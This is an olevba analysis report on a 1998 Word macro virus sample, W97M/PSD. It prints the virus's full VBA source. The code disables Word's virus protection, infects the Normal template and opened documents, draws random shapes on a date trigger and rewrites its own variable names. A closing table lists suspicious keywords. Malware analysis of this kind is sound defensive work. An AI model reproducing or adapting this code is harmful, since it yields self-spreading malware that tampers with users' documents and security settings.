olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-d37df93dc410a30969430c5c8ce7a8e3bcfb8548
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-d37df93dc410a30969430c5c8ce7a8e3bcfb8548 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For CP4325 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next CP4325: End If
RF6739 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
AN5237 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set EN3388 = ActiveDocument.VBProject.VBComponents.Item(1)
RJ144 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set EN3388 = NormalTemplate.VBProject.VBComponents.Item(1)
UL7857 = True
Call KF3037_BA371
ActiveDocument.Saved = True
End If
If UL7857 <> True And RJ144 <> True Then GoTo VK1696
If UL7857 = True Then EN3388.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RF6739 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If RJ144 = True Then EN3388.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, AN5237 - 4))
VK1696:
If AN5237 <> 0 And RF6739 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function KF3037_BA371()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "DR1937": r1(2) = "FD9076": r1(3) = "RS5335": r1(4) = "QT736": r1(5) = "BA371": r1(6) = "RF6739"
r1(7) = "AN5237": r1(8) = "RJ144":: r1(9) = "EN3388": r1(10) = "UL7857": r1(11) = "VK1696": r1(12) = "KF3037": r1(13) = "BG9048": r1(14) = "FJ6311": r1(15) = "CP4325"
For CP4325 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call BA371(a1, r1(CP4325))
Next CP4325
End Function 'VAMP v1.0 [thanks Vic!]
Private Function BA371(FJ6311, BG9048 As String)
On Error Resume Next
Dim DR1937 As Long: Dim FD9076 As Long: Dim RS5335 As Long: Dim QT736 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
DR1937 = 1: FD9076 = 1: RS5335 = .CountOfLines: QT736 = Len(.Lines(.CountOfLines, 1))
Do While .Find(BG9048, DR1937, FD9076, RS5335, QT736, True)
strline = .Lines(DR1937, 1)
strline = Left(strline, FD9076 - 1) & FJ6311 & Mid(strline, QT736)
.replaceline DR1937, strline
DR1937 = RS5335 + 1: FD9076 = 1:
RS5335 = .CountOfLines
QT736 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

